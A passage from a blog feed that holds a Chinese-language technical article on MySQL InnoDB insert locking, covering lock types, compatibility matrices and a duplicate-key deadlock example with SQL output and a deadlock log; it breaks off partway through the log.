&lt;span class=&quot;keyword&quot;&gt;left&lt;/span&gt;(urls,&lt;span class=&quot;number&quot;&gt;125&lt;/span&gt;))&lt;span class=&quot;operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;operator&quot;&gt;*&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; urls_125, &lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;distinct&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;left&lt;/span&gt;(urls,&lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;))&lt;span class=&quot;operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;operator&quot;&gt;*&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; urls_150, &lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;distinct&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;left&lt;/span&gt;(urls,&lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;))&lt;span class=&quot;operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;operator&quot;&gt;*&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; urls_200 &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; base_info;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;----------+----------+----------+----------+----------+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt; urls_full &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt; urls_100 &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt; urls_125 &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt; urls_150 &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt; urls_200 &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;----------+----------+----------+----------+----------+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;0.9859&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;0.9858&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;0.9858&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;0.9859&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;0.9859&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;|&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;----------+----------+----------+----------+----------+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;从结果可以看出，当urls取前缀长度为150时，其区分度与完整长度一致。&lt;/p&gt;</summary>
    
    
    
    <category term="数据存储" scheme="http://yeshaoting.cn/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
    
    
    <category term="mysql" scheme="http://yeshaoting.cn/tags/mysql/"/>
    
    <category term="索引" scheme="http://yeshaoting.cn/tags/%E7%B4%A2%E5%BC%95/"/>
    
  </entry>
  
  <entry>
    <title>mysql insert锁机制</title>
    <link href="http://yeshaoting.cn/article/database/mysql%20insert%E9%94%81%E6%9C%BA%E5%88%B6/"/>
    <id>http://yeshaoting.cn/article/database/mysql%20insert%E9%94%81%E6%9C%BA%E5%88%B6/</id>
    <published>2016-07-28T02:05:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/mysql.png" class="img-logo img-center" /><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>上周遇到一个因insert而引发的死锁问题，其成因比较令人费解。<br>于是想要了解一下insert加锁机制，但是发现网上介绍的文章比较少且零散，挖掘过程比较忙乱。</p><p>本以为只需要系统学习一个较完全的逻辑，但是实际牵扯很多innodb锁相关知识及加锁方式。我好像并没有那么大的能耐，把各种场景的加锁过程一一列举并加之分析；亦没有太多的精力验证网上的言论的准确性。</p><p>只好根据现在了解的内容，参考官方文档，说说自己当前的理解。<br>本文仅供参考，如有误导，概不负责。</p><h2 id="二、现场状态"><a href="#二、现场状态" class="headerlink" title="二、现场状态"></a>二、现场状态</h2><p>不同的mysql版本，不同的参数设置，都可能对加锁过程有影响。<br>分析加锁机制还是应当尽可能多地列举一下关键参数，例如：当前mysql版本、事务隔离级别等。<br>如下，仅仅只列出个别比较重要的参数。</p><h3 id="1-数据库版本"><a href="#1-数据库版本" class="headerlink" title="1.数据库版本"></a>1.数据库版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.6.27    |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure><h3 id="2-数据库引擎"><a href="#2-数据库引擎" class="headerlink" title="2. 数据库引擎"></a>2. 数据库引擎</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">&#x27;%engine%&#x27;</span>;</span><br><span class="line">+----------------------------+--------+</span><br><span class="line">| Variable_name              | Value  |</span><br><span class="line">+----------------------------+--------+</span><br><span class="line">| default_storage_engine     | InnoDB |</span><br><span class="line">| default_tmp_storage_engine | InnoDB |</span><br><span class="line">| storage_engine             | InnoDB |</span><br><span class="line">+----------------------------+--------+</span><br></pre></td></tr></table></figure><p><strong>注</strong>：InnoDB支持事务，Myisam不支持事务；InnoDB支持行锁和表锁；Myisam不支持行锁。</p><h3 id="3-事务隔离级别"><a href="#3-事务隔离级别" class="headerlink" title="3. 事务隔离级别"></a>3. 事务隔离级别</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@global.tx_isolation, @@session.tx_isolation, @@tx_isolation;</span><br><span class="line">+-----------------------+------------------------+-----------------+</span><br><span class="line">| @@global.tx_isolation | @@session.tx_isolation | @@tx_isolation  |</span><br><span class="line">+-----------------------+------------------------+-----------------+</span><br><span class="line">| REPEATABLE-READ       | REPEATABLE-READ        | REPEATABLE-READ |</span><br><span class="line">+-----------------------+------------------------+-----------------+</span><br></pre></td></tr></table></figure><p><strong>注</strong>：几种事务隔离级别：READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE</p><h3 id="4-查看gap锁开启状态"><a href="#4-查看gap锁开启状态" class="headerlink" title="4. 查看gap锁开启状态"></a>4. 查看gap锁开启状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">&#x27;innodb_locks_unsafe_for_binlog&#x27;</span>;</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| Variable_name                  | Value |</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| innodb_locks_unsafe_for_binlog | OFF   |</span><br><span class="line">+--------------------------------+-------+</span><br></pre></td></tr></table></figure><p>innodb_locks_unsafe_for_binlog：默认值为0，即启用gap lock。<br>最主要的作用就是控制innodb是否对gap加锁。<br>但是，这一设置变更并不影响外键和唯一索引（含主键）对gap进行加锁的需要。<br>开启innodb_locks_unsafe_for_binlog的REPEATABLE-READ事务隔离级别，很大程度上已经蜕变成了READ-COMMITTED。</p><p>参见官方文档[^1]：</p><blockquote><p>By default, the value of innodb_locks_unsafe_for_binlog is 0 (disabled), which means that gap locking is enabled: InnoDB uses next-key locks for searches and index scans. To enable the variable, set it to 1. This causes gap locking to be disabled: InnoDB uses only index-record locks for searches and index scans.</p></blockquote><blockquote><p>Enabling innodb_locks_unsafe_for_binlog does not disable the use of gap locking for foreign-key constraint checking or duplicate-key checking.</p></blockquote><blockquote><p>The effect of enabling innodb_locks_unsafe_for_binlog is similar to but not identical to setting the transaction isolation level to READ COMMITTED.</p></blockquote><h3 id="5-查看自增锁模式"><a href="#5-查看自增锁模式" class="headerlink" title="5. 查看自增锁模式"></a>5. 查看自增锁模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">&#x27;innodb_autoinc_lock_mode&#x27;</span>;</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| Variable_name            | Value |</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| innodb_autoinc_lock_mode | 1     |</span><br><span class="line">+--------------------------+-------+</span><br></pre></td></tr></table></figure><p>innodb_autoinc_lock_mode有3种配置模式：0、1、2，分别对应”传统模式”, “连续模式”, “交错模式”。[^8]<br>传统模式：涉及auto-increment列的插入语句加的表级AUTO-INC锁，只有插入执行结束后才会释放锁。这是一种兼容MySQL 5.1之前版本的策略。<br>连续模式：可以事先确定插入行数的语句(包括单行和多行插入)，分配连续的确定的auto-increment值；对于插入行数不确定的插入语句，仍加表锁。这种模式下，事务回滚，auto-increment值不会回滚，换句话说，自增列内容会不连续。<br>交错模式：同一时刻多条SQL语句产生交错的auto-increment值。</p><p>由于insert语句常常涉及自增列的加锁过程，会涉及到AUTO-INC Locks加锁过程。<br>为了分步了解insert加锁过程，本文暂不讨论任何涉及自增列的加锁逻辑。<br>这一参数设置相关内容可能会出现在我的下一篇文章里。</p><span id="more"></span><h3 id="n-etc"><a href="#n-etc" class="headerlink" title="n. etc"></a>n. etc</h3><p>相关的参数配置越详情越好。</p><h2 id="三、InnoDB锁类型-2"><a href="#三、InnoDB锁类型-2" class="headerlink" title="三、InnoDB锁类型[^2]"></a>三、InnoDB锁类型[^2]</h2><h3 id="1-基本锁"><a href="#1-基本锁" class="headerlink" title="1. 基本锁"></a>1. 基本锁</h3><p>基本锁：共享锁(Shared Locks：S锁)与排他锁(Exclusive Locks：X锁)</p><p>mysql允许拿到S锁的事务读一行，允许拿到X锁的事务更新或删除一行。<br>加了S锁的记录，允许其他事务再加S锁，不允许其他事务再加X锁；<br>加了X锁的记录，不允许其他事务再加S锁或者X锁。</p><p>mysql对外提供加这两种锁的语法如下：<br>加S锁：select…lock in share mode<br>加X锁：select…for update</p><h3 id="2-意向锁-Intention-Locks"><a href="#2-意向锁-Intention-Locks" class="headerlink" title="2. 意向锁(Intention Locks)"></a>2. 意向锁(Intention Locks)</h3><p>InnoDB为了支持多粒度(表锁与行锁)的锁并存，引入意向锁。<br>意向锁是表级锁，可分为意向共享锁(IS锁)和意向排他锁(IX锁)。</p><blockquote><p>InnoDB supports multiple granularity locking which permits coexistence of row-level locks and locks on entire tables. To make locking at multiple granularity levels practical, additional types of locks called intention locks are used. Intention locks are table-level locks in InnoDB that indicate which type of lock (shared or exclusive) a transaction will require later for a row in that table. There are two types of intention locks used in InnoDB (assume that transaction T has requested a lock of the indicated type on table t):<br>Intention shared (IS): Transaction T intends to set S locks on individual rows in table t.<br>Intention exclusive (IX): Transaction T intends to set X locks on those rows.</p></blockquote><p>事务在请求S锁和X锁前，需要先获得对应的IS、IX锁。</p><blockquote><p>Before a transaction can acquire an S lock on a row in table t, it must first acquire an IS or stronger lock on t. Before a transaction can acquire an X lock on a row, it must first acquire an IX lock on t.</p></blockquote><p>意向锁产生的主要目的是为了处理行锁和表锁之间的冲突，用于表明“某个事务正在某一行上持有了锁，或者准备去持有锁”。</p><blockquote><p>The main purpose of IX and IS locks is to show that someone is locking a row, or going to lock a row in the table.</p></blockquote><p>共享锁、排他锁与意向锁的兼容矩阵如下：</p><table><thead><tr><th align="center"></th><th align="center">X</th><th align="center">IX</th><th align="center">S</th><th align="center">IS</th></tr></thead><tbody><tr><td align="center">X</td><td align="center"><code>冲突</code></td><td align="center"><code>冲突</code></td><td align="center"><code>冲突</code></td><td align="center"><code>冲突</code></td></tr><tr><td align="center">IX</td><td align="center"><code>冲突</code></td><td align="center">兼容</td><td align="center"><code>冲突</code></td><td align="center">兼容</td></tr><tr><td align="center">S</td><td align="center"><code>冲突</code></td><td align="center"><code>冲突</code></td><td align="center">兼容</td><td align="center">兼容</td></tr><tr><td align="center">IS</td><td align="center"><code>冲突</code></td><td align="center">兼容</td><td align="center">兼容</td><td align="center">兼容</td></tr></tbody></table><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>从官方文档字面意思上看意向锁是表级锁，但是大牛<strong>不认为</strong>“Intention lock 是表级锁”[^5]?<br>另外，由于意向锁主要用于解决行锁与表锁间冲突问题，鉴于平时表级操作特别少，在分析加锁过程是否可以不用过多考虑意向锁的问题?</p><h3 id="3-行锁"><a href="#3-行锁" class="headerlink" title="3. 行锁"></a>3. 行锁</h3><h4 id="记录锁-Record-Locks"><a href="#记录锁-Record-Locks" class="headerlink" title="记录锁(Record Locks)"></a>记录锁(Record Locks)</h4><p>记录锁, 仅仅锁住索引记录的一行。<br>单条索引记录上加锁，record lock锁住的永远是索引，而非记录本身，即使该表上没有任何索引，那么innodb会在后台创建一个隐藏的聚集主键索引，那么锁住的就是这个隐藏的聚集主键索引。所以说当一条sql没有走任何索引时，那么将会在每一条聚集索引后面加X锁，这个类似于表锁，但原理上和表锁应该是完全不同的。</p><p>参见官方文档[^3]：</p><blockquote><p>If the table has no PRIMARY KEY or suitable UNIQUE index, InnoDB internally generates a hidden clustered index on a synthetic column containing row ID values. The rows are ordered by the ID that InnoDB assigns to the rows in such a table. The row ID is a 6-byte field that increases monotonically as new rows are inserted. Thus, the rows ordered by the row ID are physically in insertion order.</p></blockquote><h4 id="间隙锁-Gap-Locks"><a href="#间隙锁-Gap-Locks" class="headerlink" title="间隙锁(Gap Locks)"></a>间隙锁(Gap Locks)</h4><p>区间锁, 仅仅锁住一个索引区间(开区间)。<br>在索引记录之间的间隙中加锁，或者是在某一条索引记录之前或者之后加锁，并不包括该索引记录本身。</p><h4 id="next-key锁-Next-Key-Locks"><a href="#next-key锁-Next-Key-Locks" class="headerlink" title="next-key锁(Next-Key Locks)"></a>next-key锁(Next-Key Locks)</h4><p>record lock + gap lock, 左开右闭区间。</p><blockquote><p>A next-key lock is a combination of a record lock on the index record and a gap lock on the gap before the index record.</p></blockquote><blockquote><p>By default, InnoDB operates in REPEATABLE READ transaction isolation level and with the innodb_locks_unsafe_for_binlog system variable disabled. In this case, InnoDB uses next-key locks for searches and index scans, which prevents phantom rows。</p></blockquote><p>默认情况下，innodb使用next-key locks来锁定记录。<br>但当查询的索引含有唯一属性的时候，Next-Key Lock 会进行优化，将其降级为Record Lock，即仅锁住索引本身，不是范围。</p><h4 id="插入意向锁-Insert-Intention-Locks"><a href="#插入意向锁-Insert-Intention-Locks" class="headerlink" title="插入意向锁(Insert Intention Locks)"></a>插入意向锁(Insert Intention Locks)</h4><p>Gap Lock中存在一种插入意向锁（Insert Intention Lock），在insert操作时产生。在多事务同时写入不同数据至同一索引间隙的时候，并不需要等待其他事务完成，不会发生锁等待。<br>假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。</p><blockquote><p>An insert intention lock is a type of gap lock set by INSERT operations prior to row insertion. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6, respectively, each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.</p></blockquote><p><strong>注</strong>：插入意向锁并非意向锁，而是一种特殊的间隙锁。</p><h3 id="4-行锁的兼容矩阵-4"><a href="#4-行锁的兼容矩阵-4" class="headerlink" title="4. 行锁的兼容矩阵[^4]"></a>4. 行锁的兼容矩阵[^4]</h3><table><thead><tr><th></th><th>Gap</th><th>Insert Intention</th><th>Record</th><th>Next-Key</th></tr></thead><tbody><tr><td><strong>Gap</strong></td><td>兼容</td><td>兼容</td><td>兼容</td><td>兼容</td></tr><tr><td><strong>Insert Intention</strong></td><td><code>冲突</code></td><td>兼容</td><td>兼容</td><td><code>冲突</code></td></tr><tr><td><strong>Record</strong></td><td>兼容</td><td>兼容</td><td><code>冲突</code></td><td><code>冲突</code></td></tr><tr><td><strong>Next-Key</strong></td><td>兼容</td><td>兼容</td><td><code>冲突</code></td><td><code>冲突</code></td></tr></tbody></table><p><strong>表注</strong>：横向是已经持有的锁，纵向是正在请求的锁。</p><p>由于S锁和S锁是完全兼容的，因此在判别兼容性时只考虑持有的锁与请求的锁是这三种组合情形：X、S和S、X和X、X。<br>另外，需要提醒注意的是进行兼容判断也只是针对于加锁涉及的行有交集的情形。</p><p>分析兼容矩阵可以得出如下几个结论：</p><ul><li>INSERT操作之间不会有冲突。</li><li>GAP,Next-Key会阻止Insert。</li><li>GAP和Record,Next-Key不会冲突</li><li>Record和Record、Next-Key之间相互冲突。</li><li>已有的Insert锁不阻止任何准备加的锁。</li></ul><h3 id="5-自增锁-AUTO-INC-Locks"><a href="#5-自增锁-AUTO-INC-Locks" class="headerlink" title="5. 自增锁(AUTO-INC Locks)"></a>5. 自增锁(AUTO-INC Locks)</h3><p>AUTO-INC锁是一种特殊的表级锁，发生涉及AUTO_INCREMENT列的事务性插入操作时产生。</p><p>官方解释如下[^3]：</p><blockquote><p>An AUTO-INC lock is a special table-level lock taken by transactions inserting into tables with AUTO_INCREMENT columns. In the simplest case, if one transaction is inserting values into the table, any other transactions must wait to do their own inserts into that table, so that rows inserted by the first transaction receive consecutive primary key values.</p></blockquote><h2 id="四、insert加锁过程"><a href="#四、insert加锁过程" class="headerlink" title="四、insert加锁过程"></a>四、insert加锁过程</h2><p>官方文档[^6]对于insert加锁的描述如下：</p><blockquote><p>INSERT sets an exclusive lock on the inserted row. This lock is an index-record lock, not a next-key lock (that is, there is no gap lock) and does not prevent other sessions from inserting into the gap before the inserted row.</p></blockquote><blockquote><p>Prior to inserting the row, a type of gap lock called an insert intention gap lock is set. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6 each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.</p></blockquote><blockquote><p>If a duplicate-key error occurs, a shared lock on the duplicate index record is set. This use of a shared lock can result in deadlock should there be multiple sessions trying to insert the same row if another session already has an exclusive lock.</p></blockquote><p>简单的insert会在insert的行对应的索引记录上加一个排它锁，这是一个record lock，并没有gap，所以并不会阻塞其他session在gap间隙里插入记录。</p><p>不过在insert操作之前，还会加一种锁，官方文档称它为insertion intention gap lock，也就是意向的gap锁。这个意向gap锁的作用就是预示着当多事务并发插入相同的gap空隙时，只要插入的记录不是gap间隙中的相同位置，则无需等待其他session就可完成，这样就使得insert操作无须加真正的gap lock。<br>假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。</p><p>假设发生了一个唯一键冲突错误，那么将会在重复的索引记录上加读锁。当有多个session同时插入相同的行记录时，如果另外一个session已经获得该行的排它锁，那么将会导致死锁。</p><h3 id="思考：Insert-Intention-Locks作用"><a href="#思考：Insert-Intention-Locks作用" class="headerlink" title="思考：Insert Intention Locks作用"></a>思考：Insert Intention Locks作用</h3><p>Insert Intention Locks的引入，我理解是为了提高数据插入的并发能力。<br>如果没有Insert Intention Locks的话，可能就需要使用Gap Locks来代替。</p><h2 id="五、insert死锁场景分析"><a href="#五、insert死锁场景分析" class="headerlink" title="五、insert死锁场景分析"></a>五、insert死锁场景分析</h2><p>接下来，带大家看几个与insert相关的死锁场景。</p><h3 id="1-duplicate-key-error引发的死锁"><a href="#1-duplicate-key-error引发的死锁" class="headerlink" title="1. duplicate key error引发的死锁"></a>1. duplicate key error引发的死锁</h3><p>这个场景主要发生在两个以上的事务同时进行唯一键值相同的记录插入操作。</p><h4 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `aa` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">10</span>) unsigned <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;主键&#x27;</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">  `age` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">  `stage` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;关卡数&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `udx_name` (`name`),</span><br><span class="line">  KEY `idx_stage` (`stage`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure><h4 id="表数据"><a href="#表数据" class="headerlink" title="表数据"></a>表数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from aa;</span><br><span class="line">+----+------+-----+-------+</span><br><span class="line">| id | name | age | stage |</span><br><span class="line">+----+------+-----+-------+</span><br><span class="line">|  1 | yst  |  11 |     8 |</span><br><span class="line">|  2 | dxj  |   7 |     4 |</span><br><span class="line">|  3 | lb   |  13 |     7 |</span><br><span class="line">|  4 | zsq  |   5 |     7 |</span><br><span class="line">|  5 | lxr  |  13 |     4 |</span><br><span class="line">+----+------+-----+-------+</span><br></pre></td></tr></table></figure><h4 id="事务执行时序表"><a href="#事务执行时序表" class="headerlink" title="事务执行时序表"></a>事务执行时序表</h4><table><thead><tr><th>T1(36727)</th><th>T2(36728)</th><th>T3(36729)</th></tr></thead><tbody><tr><td>begin;</td><td>begin;</td><td>begin;</td></tr><tr><td>insert into aa values(6, ‘test’, 12, 3);</td><td></td><td></td></tr><tr><td></td><td>insert into aa values(6, ‘test’, 12, 3);</td><td></td></tr><tr><td></td><td></td><td>insert into aa values(6, ‘test’, 12, 3);</td></tr><tr><td>rollback;</td><td></td><td></td></tr><tr><td></td><td></td><td>ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction</td></tr><tr><td></td><td>Query OK, 1 row affected (13.10 sec)</td><td>&nbsp;</td></tr></tbody></table><p>如果T1未rollback，而是commit的话，T2和T3会报唯一键冲突：ERROR 1062 (23000): Duplicate entry ‘6’ for key ‘PRIMARY’</p><h4 id="事务锁占用情况"><a href="#事务锁占用情况" class="headerlink" title="事务锁占用情况"></a>事务锁占用情况</h4><p>T1 rollback前，各事务锁占用情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from information_schema.innodb_locks;</span><br><span class="line">+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+</span><br><span class="line">| lock_id      | lock_trx_id | lock_mode | lock_type | lock_table  | lock_index | lock_space | lock_page | lock_rec | lock_data |</span><br><span class="line">+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+</span><br><span class="line">| 36729:24:3:7 | 36729       | S         | RECORD    | `<span class="built_in">test</span>`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |</span><br><span class="line">| 36727:24:3:7 | 36727       | X         | RECORD    | `<span class="built_in">test</span>`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |</span><br><span class="line">| 36728:24:3:7 | 36728       | S         | RECORD    | `<span class="built_in">test</span>`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |</span><br><span class="line">+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+</span><br></pre></td></tr></table></figure><p><strong>注</strong>：mysql有自己的一套规则来决定T2与T3哪个进行回滚，本文不做讨论。</p><h4 id="死锁日志"><a href="#死锁日志" class="headerlink" title="死锁日志"></a>死锁日志</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">------------------------</span><br><span class="line">LATEST DETECTED DEADLOCK</span><br><span class="line">------------------------</span><br><span class="line">2016-07-21 19:34:23 700000a3f000</span><br><span class="line">*** (1) TRANSACTION:</span><br><span class="line">TRANSACTION 36728, ACTIVE 199 sec inserting</span><br><span class="line">mysql tables <span class="keyword">in</span> use 1, locked 1</span><br><span class="line">LOCK WAIT 4 lock struct(s), heap size 1184, 2 row lock(s)</span><br><span class="line">MySQL thread id 13, OS thread handle 0x700000b0b000, query id 590 localhost root update</span><br><span class="line">insert into aa values(6, <span class="string">&#x27;test&#x27;</span>, 12, 3)</span><br><span class="line">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</span><br><span class="line">RECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `<span class="built_in">test</span>`.`aa` trx id 36728 lock_mode X insert intention waiting</span><br><span class="line">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</span><br><span class="line"> 0: len 8; hex 73757072656d756d; asc supremum;;</span><br><span class="line"></span><br><span class="line">*** (2) TRANSACTION:</span><br><span class="line">TRANSACTION 36729, ACTIVE 196 sec inserting</span><br><span class="line">mysql tables <span class="keyword">in</span> use 1, locked 1</span><br><span class="line">4 lock struct(s), heap size 1184, 2 row lock(s)</span><br><span class="line">MySQL thread id 14, OS thread handle 0x700000a3f000, query id 591 localhost root update</span><br><span class="line">insert into aa values(6, <span class="string">&#x27;test&#x27;</span>, 12, 3)</span><br><span class="line">*** (2) HOLDS THE LOCK(S):</span><br><span class="line">RECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `<span class="built_in">test</span>`.`aa` trx id 36729 lock mode S</span><br><span class="line">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</span><br><span class="line"> 0: len 8; hex 73757072656d756d; asc supremum;;</span><br><span class="line"></span><br><span class="line">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</span><br><span class="line">RECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `<span 